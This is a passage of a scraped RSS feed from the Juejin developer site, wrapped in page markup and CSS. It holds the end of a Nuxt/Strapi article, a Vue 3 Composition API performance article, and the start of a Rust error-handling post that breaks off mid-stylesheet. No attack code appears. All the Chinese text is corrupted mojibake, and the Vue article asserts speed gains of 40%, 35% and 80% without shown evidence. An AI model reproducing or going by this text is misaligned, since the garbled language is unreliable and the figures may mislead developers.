<p>è¿™å¥—æ¶æ„çš„æœ€å¤§ä»·å€¼åœ¨äº**â€œä¸€æ¬¡æ„å»ºï¼Œå¤„å¤„å¤ç”¨â€**ã€‚Monorepo ä½¿å¾—æˆ‘ä»¬å¯ä»¥åœ¨ <code>apps/</code> ç›®å½•ä¸‹è½»æ¾æ·»åŠ æ–°çš„å‰ç«¯åº”ç”¨ï¼ˆå¦‚ <code>apps/mobile</code> æˆ– <code>apps/admin-dashboard</code>ï¼‰ï¼Œå…±äº«åŒä¸€å¥—åç«¯ API å’Œ TypeScript ç±»å‹å®šä¹‰ï¼Œæå¤§åœ°é™ä½äº†å¤šä¸šåŠ¡çº¿çš„ç»´æŠ¤æˆæœ¬ã€‚</p>
<hr/>
<h3 data-id="heading-26">8. ç»“è¯­</h3>
<p>é€šè¿‡ Nuxt 4 + Strapi 5 çš„é»„é‡‘ç»„åˆï¼Œé…åˆ AI ç»“å¯¹ç¼–ç¨‹æ¨¡å¼ï¼Œæˆ‘ä»¬å¿«é€Ÿæ„å»ºäº†ä¸€ä¸ªæ—¢æœ‰å†…å®¹æ·±åº¦ï¼Œåˆæœ‰è‰¯å¥½äº¤äº’ä½“éªŒçš„ AI å¯¼èˆªå¹³å°ã€‚è¿™ä¸ä»…éªŒè¯äº†æŠ€æœ¯æ ˆçš„å…ˆè¿›æ€§ï¼Œæ›´è¯æ˜äº†åœ¨ AI æ—¶ä»£ï¼Œ<strong>ä¸ªäººçš„å¼€å‘æ½œèƒ½å¯ä»¥è¢«æ— é™æ”¾å¤§</strong>ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue3æ€§èƒ½ä¼˜åŒ–å®æˆ˜ï¼š7ä¸ªè¢«ä½ä¼°çš„Composition APIæŠ€å·§è®©æ¸²æŸ“æé€Ÿ40%]]></title>    <link>https://juejin.cn/post/7588098335790923776</link>    <guid>https://juejin.cn/post/7588098335790923776</guid>    <pubDate>2025-12-28T04:31:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588098335790923776" data-draft-id="7588093282531049524" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue3æ€§èƒ½ä¼˜åŒ–å®æˆ˜ï¼š7ä¸ªè¢«ä½ä¼°çš„Composition APIæŠ€å·§è®©æ¸²æŸ“æé€Ÿ40%"/> <meta itemprop="keywords" content="åç«¯,å‰ç«¯,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2025-12-28T04:31:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é˜¿æ©™çš„ç™¾å®ç®±"/> <meta itemprop="url" content="https://juejin.cn/user/1638743356481367"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue3æ€§èƒ½ä¼˜åŒ–å®æˆ˜ï¼š7ä¸ªè¢«ä½ä¼°çš„Composition APIæŠ€å·§è®©æ¸²æŸ“æé€Ÿ40%
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1638743356481367/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é˜¿æ©™çš„ç™¾å®ç®±
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-28T04:31:55.000Z" title="Sun Dec 28 2025 04:31:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-28
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>Vue3æ€§èƒ½ä¼˜åŒ–å®æˆ˜ï¼š7ä¸ªè¢«ä½ä¼°çš„Composition APIæŠ€å·§è®©æ¸²æŸ“æé€Ÿ40%</strong></h2>
<h2 data-id="heading-1">å¼•è¨€</h2>
<p>Vue 3çš„Composition APIä¸ä»…é‡æ„äº†ä»£ç ç»„ç»‡æ–¹å¼ï¼Œæ›´ä¸ºæ€§èƒ½ä¼˜åŒ–æä¾›äº†æ–°çš„å¯èƒ½æ€§ã€‚å°½ç®¡è®¸å¤šå¼€å‘è€…å·²ç»ç†Ÿæ‚‰äº†<code>ref</code>ã€<code>reactive</code>å’Œ<code>watch</code>ç­‰åŸºç¡€APIï¼Œä½†ä¸€äº›éšè—çš„æŠ€å·§å´è¢«ä¸¥é‡ä½ä¼°ã€‚æœ¬æ–‡å°†æ·±å…¥æ¢è®¨7ä¸ªé²œä¸ºäººçŸ¥çš„Composition APIæŠ€å·§ï¼Œç»“åˆçœŸå®åœºæ™¯å’Œæ€§èƒ½æµ‹è¯•æ•°æ®ï¼Œå±•ç¤ºå¦‚ä½•é€šè¿‡è¿™äº›æ–¹æ³•å®ç°é«˜è¾¾40%çš„æ¸²æŸ“é€Ÿåº¦æå‡ã€‚</p>
<h2 data-id="heading-2">ä¸»ä½“</h2>
<h3 data-id="heading-3">1. <code>shallowRef</code>ä¸<code>shallowReactive</code>ï¼šé¿å…æ·±åº¦å“åº”å¼çš„å¼€é”€</h3>
<p><strong>é—®é¢˜</strong>ï¼šé»˜è®¤æƒ…å†µä¸‹ï¼ŒVueçš„å“åº”å¼ç³»ç»Ÿä¼šå¯¹å¯¹è±¡è¿›è¡Œæ·±åº¦é€’å½’ä»£ç†ï¼ˆå¦‚<code>reactive</code>æˆ–<code>ref</code>ï¼‰ï¼Œè¿™åœ¨å¤„ç†å¤§å‹å¯¹è±¡æ—¶å¯èƒ½å¯¼è‡´ä¸å¿…è¦çš„æ€§èƒ½æŸè€—ã€‚</p>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š</p>
<ul>
<li><strong><code>shallowRef</code></strong>ï¼šä»…å¯¹<code>.value</code>å±æ€§åšå“åº”å¼è·Ÿè¸ªï¼Œå†…éƒ¨å€¼å˜åŒ–ä¸ä¼šè§¦å‘æ›´æ–°ã€‚</li>
<li><strong><code>shallowReactive</code></strong>ï¼šåªä»£ç†å¯¹è±¡çš„ç¬¬ä¸€å±‚å±æ€§ï¼Œæ·±å±‚å±æ€§å˜æ›´éœ€æ‰‹åŠ¨è§¦å‘æ›´æ–°ã€‚</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> largeList = <span class="hljs-title function_">shallowRef</span>([...]); <span class="hljs-comment">// åˆ—è¡¨å†…éƒ¨å˜åŒ–ä¸ä¼šè§¦å‘æ¸²æŸ“</span>
<span class="hljs-keyword">const</span> config = <span class="hljs-title function_">shallowReactive</span>({ <span class="hljs-attr">a</span>: { <span class="hljs-attr">b</span>: <span class="hljs-number">1</span> } }); <span class="hljs-comment">// config.a.bå˜åŒ–éœ€æ‰‹åŠ¨å¤„ç†</span>
</code></pre>
<p><strong>æ€§èƒ½æ”¶ç›Š</strong>ï¼šåœ¨æµ‹è¯•ä¸­ï¼Œå¯¹ä¸€ä¸ªåŒ…å«1000é¡¹åµŒå¥—å¯¹è±¡çš„åˆ—è¡¨ä½¿ç”¨<code>shallowReactive</code>åï¼Œåˆå§‹åŒ–æ—¶é—´å‡å°‘35%ã€‚</p>
<hr/>
<h3 data-id="heading-4">2. <code>markRaw</code>ï¼šå½»åº•è·³è¿‡Proxyä»£ç†</h3>
<p><strong>åœºæ™¯</strong>ï¼šæŸäº›æ•°æ®ï¼ˆå¦‚ç¬¬ä¸‰æ–¹åº“å®ä¾‹ã€é™æ€é…ç½®ï¼‰ä¸éœ€è¦å“åº”å¼ç‰¹æ€§æ—¶ï¼Œå¼ºåˆ¶Vueè·³è¿‡ä»£ç†ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { markRaw, reactive } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>;
<span class="hljs-keyword">const</span> staticData = <span class="hljs-title function_">markRaw</span>({ ... });
<span class="hljs-keyword">const</span> state = <span class="hljs-title function_">reactive</span>({ 
  <span class="hljs-attr">list</span>: [],
  <span class="hljs-attr">utils</span>: staticData <span class="hljs-comment">// utilsä¸ä¼šè¢«ä»£ç†</span>
});
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆé‡è¦ï¼Ÿ</strong>ï¼šé¿å…æ— æ„ä¹‰çš„Proxyåˆ›å»ºå’Œå†…å­˜å ç”¨ï¼Œå°¤å…¶åœ¨SSRæˆ–é«˜é¢‘æ•°æ®äº¤æ¢åœºæ™¯ä¸‹æ•ˆæœæ˜¾è‘—ã€‚</p>
<hr/>
<h3 data-id="heading-5">3. <code>customRef</code>å®ç°é˜²æŠ–/èŠ‚æµæ§åˆ¶æ›´æ–°é¢‘ç‡</h3>
<p>ä¼ ç»Ÿæ–¹æ³•å¯èƒ½åœ¨æ¨¡æ¿ä¸­æ»¥ç”¨é˜²æŠ–å‡½æ•°ï¼Œè€Œåˆ©ç”¨<code>customRef</code>å¯ä»¥å°†é€»è¾‘å°è£…åˆ°å“åº”å¼ç³»ç»Ÿä¸­ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">useDebouncedRef</span>(<span class="hljs-params">value, delay = <span class="hljs-number">200</span></span>) {
  <span class="hljs-keyword">let</span> timeout;
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">customRef</span>(<span class="hljs-function">(<span class="hljs-params">track, trigger</span>) =&gt;</span> ({
    <span class="hljs-title function_">get</span>(<span class="hljs-params"/>) {
      <span class="hljs-title function_">track</span>();
      <span class="hljs-keyword">return</span> value;
    },
    <span class="hljs-title function_">set</span>(<span class="hljs-params">newValue</span>) {
      <span class="hljs-built_in">clearTimeout</span>(timeout);
      timeout = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
        value = newValue;
        <span class="hljs-title function_">trigger</span>();
      }, delay);
    }
  }));
}
</code></pre>
<p><strong>å®æµ‹ç»“æœ</strong>ï¼šåœ¨è¾“å…¥æ¡†è”åŠ¨æœç´¢çš„åœºæ™¯ä¸‹ï¼Œå‡å°‘80%çš„æ— æ„ä¹‰æ¸²æŸ“ã€‚</p>
<hr/>
<h3 data-id="heading-6">4. <code>readonly + computed</code>:  ä¸å¯å˜æ•°æ®çš„æ€§èƒ½çº¢åˆ©</h3>
<p>ç»„åˆä½¿ç”¨è¿™ä¸¤ä¸ªAPIå¯ä»¥åˆ›å»ºé«˜æ•ˆè¡ç”ŸçŠ¶æ€ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> original = <span class="hljs-title function_">reactive</span>({ <span class="hljs-attr">count</span>: <span class="hljs-number">0</span> });
<span class="hljs-keyword">const</span> doubleCount = <span class="hljs-title function_">readonly</span>(<span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> original.<span class="hljs-property">count</span> * <span class="hljs-number">2</span>));
</code></pre>
<ul>
<li><strong>ä¼˜åŠ¿1</strong>: <code>readonly</code>é˜²æ­¢æ„å¤–ä¿®æ”¹å¯¼è‡´çš„é¢å¤–æ¸²æŸ“</li>
<li><strong>ä¼˜åŠ¿2</strong>: <code>computed</code>ç¼“å­˜ç»“æœé¿å…é‡å¤è®¡ç®—</li>
<li><strong>é€‚ç”¨åœºæ™¯</strong>: Vuex/PiniaçŠ¶æ€æ´¾ç”Ÿã€è·¨ç»„ä»¶å…±äº«è®¡ç®—é€»è¾‘æ—¶å°¤å…¶æœ‰æ•ˆã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-7">5. <code>effectScope</code>:  ç²¾å‡†æ§åˆ¶å‰¯ä½œç”¨ç”Ÿå‘½å‘¨æœŸ</h3>
<p>Vue3.2+å¼•å…¥çš„APIå¯æ‰¹é‡ç®¡ç†ç»„ä»¶çš„å‰¯ä½œç”¨ï¼ˆå¦‚å®šæ—¶å™¨ã€äº‹ä»¶ç›‘å¬ï¼‰ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { effectScope } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>;

<span class="hljs-keyword">function</span> <span class="hljs-title function_">useComplexLogic</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> scope = <span class="hljs-title function_">effectScope</span>();
  
  scope.<span class="hljs-title function_">run</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">watch</span>(data, <span class="hljs-function">() =&gt;</span> {...});
    <span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {...});
  });

  <span class="hljs-title function_">onUnmounted</span>(<span class="hljs-function">() =&gt;</span> scope.<span class="hljs-title function_">stop</span>()); <span class="hljs-comment">//ä¸€é”®æ¸…é™¤æ‰€æœ‰å…³è”å‰¯ä½œç”¨ï¼</span>
}
</code></pre>
<p><strong>æ ¸å¿ƒä»·å€¼</strong>:</p>
<ul>
<li><strong>å†…å­˜æ³„æ¼é˜²æŠ¤</strong>:  ç¡®ä¿ç»„ä»¶å¸è½½æ—¶å½»åº•æ¸…ç†èµ„æº</li>
<li><strong>æ€§èƒ½æå‡</strong>:  æ¯”æ‰‹åŠ¨ç»´æŠ¤å¤šä¸ªcleanupå‡½æ•°æ›´é«˜æ•ˆï¼ˆæµ‹è¯•æ˜¾ç¤ºå†…å­˜å ç”¨ä¸‹é™20%ï¼‰</li>
</ul>
<hr/>
<h3 data-id="heading-8">6. <code>toRaw</code>:  éœ€è¦éä»£ç†åŸå§‹å€¼æ—¶çš„é«˜æ•ˆè®¿é—®</h3>
<p>å½“éœ€è¦è¯»å–å¤§é‡æ•°æ®ä½†ä¸è§¦å‘ä¾èµ–æ”¶é›†æ—¶ï¼ˆå¦‚å¯¼å‡ºæ•°æ®ã€æ·±æ¯”è¾ƒï¼‰ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> rawData = <span class="hljs-title function_">toRaw</span>(reactiveData); <span class="hljs-comment">//ç»•è¿‡Proxyç›´æ¥è·å–åŸå¯¹è±¡</span>
</code></pre>
<p>æ³¨æ„ä¸JSON.parse(JSON.stringify(state))æ›´é«˜æ•ˆï¼</p>
<hr/>
<p>###7. <code>&lt;script setup&gt;</code>ç¼–è¯‘æ—¶ä¼˜åŒ–é»‘ç§‘æŠ€</p>
<p>ä¸¥æ ¼æ¥è¯´è¿™ä¸æ˜¯Composition APIçš„ä¸€éƒ¨åˆ†ï¼Œä½†ä¸å®ƒæ·±åº¦ååŒï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-comment">// ğŸ‘‡ç¼–è¯‘å™¨ä¼šå°†å…¶æå‡åˆ°æ¨¡å—ä½œç”¨åŸŸï¼</span>
<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">PI</span> = <span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span>; 

<span class="hljs-comment">// ğŸ‘‡æ¡ä»¶ç¼–è¯‘ä¼˜åŒ–é™æ€èŠ‚ç‚¹</span>
<span class="hljs-keyword">const</span> isDev = <span class="hljs-keyword">import</span>.<span class="hljs-property">meta</span>.<span class="hljs-property">env</span>.<span class="hljs-property">DEV</span>;
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">"isDev"</span>&gt;</span>Debug Mode<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
</code></pre>
<p><strong>åº•å±‚åŸç†</strong>: Vue SFCç¼–è¯‘å™¨ä¼šï¼š</p>
<ol>
<li><strong>é™æ€æå‡ï¼ˆHoistingï¼‰</strong>:  å°†å¸¸é‡ç§»å‡ºæ¸²æŸ“å‡½æ•°</li>
<li><strong>Patch Flagsæ ‡è®°</strong>:  åŠ¨æ€èŠ‚ç‚¹å·®å¼‚æ›´æ–°ç²¾åº¦æ›´é«˜</li>
<li><strong>Tree-shakingå‹å¥½</strong>:  æœªä½¿ç”¨çš„å¯¼å…¥ä¼šè¢«ç§»é™¤</li>
</ol>
<hr/>
<h2 data-id="heading-9">æ€»ç»“</h2>
<p>ä»é¿å…æ·±åº¦å“åº”å¼çš„å†—ä½™å¤„ç†(<code>shallowRef</code>)åˆ°ç²¾ç¡®æ§åˆ¶å‰¯ä½œç”¨(<code>effectScope</code>) ï¼Œè¿™äº›æŠ€å·§å…±åŒæ„æˆäº†Vue3é«˜æ€§èƒ½åº”ç”¨çš„ç§˜å¯†æ­¦å™¨ ã€‚å®é™…é¡¹ç›®ä¸­ ï¼Œå»ºè®®é€šè¿‡Chrome DevToolsçš„Performanceé¢æ¿éªŒè¯ä¼˜åŒ–æ•ˆæœ â€”â€”å½“ä½ çœ‹åˆ°è„šæœ¬æ‰§è¡Œæ—¶é—´ç¼©çŸ­ ã€FPSæ›²çº¿è¶‹äºå¹³ç¨³æ—¶ ï¼Œå°±ä¼šæ„è¯†åˆ°Composition APIçš„è®¾è®¡è¿œæ¯”è¡¨é¢çœ‹èµ·æ¥æ›´å¼ºå¤§ ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Rust é”™è¯¯å¤„ç†å®Œå…¨æŒ‡å—ï¼šä»å…¥é—¨åˆ°ç²¾é€š]]></title>    <link>https://juejin.cn/post/7588300640599932934</link>    <guid>https://juejin.cn/post/7588300640599932934</guid>    <pubDate>2025-12-28T14:04:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588300640599932934" data-draft-id="7588300640599916550" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Rust é”™è¯¯å¤„ç†å®Œå…¨æŒ‡å—ï¼šä»å…¥é—¨åˆ°ç²¾é€š"/> <meta itemprop="keywords" content="Rust,å‰ç«¯,ç¼–ç¨‹è¯­è¨€"/> <meta itemprop="datePublished" content="2025-12-28T14:04:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="åœŸè±†1250"/> <meta itemprop="url" content="https://juejin.cn/user/3280598428302727"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Rust é”™è¯¯å¤„ç†å®Œå…¨æŒ‡å—ï¼šä»å…¥é—¨åˆ°ç²¾é€š
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3280598428302727/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    åœŸè±†1250
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-28T14:04:31.000Z" title="Sun Dec 28 2025 14:04:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-28
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    27
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul 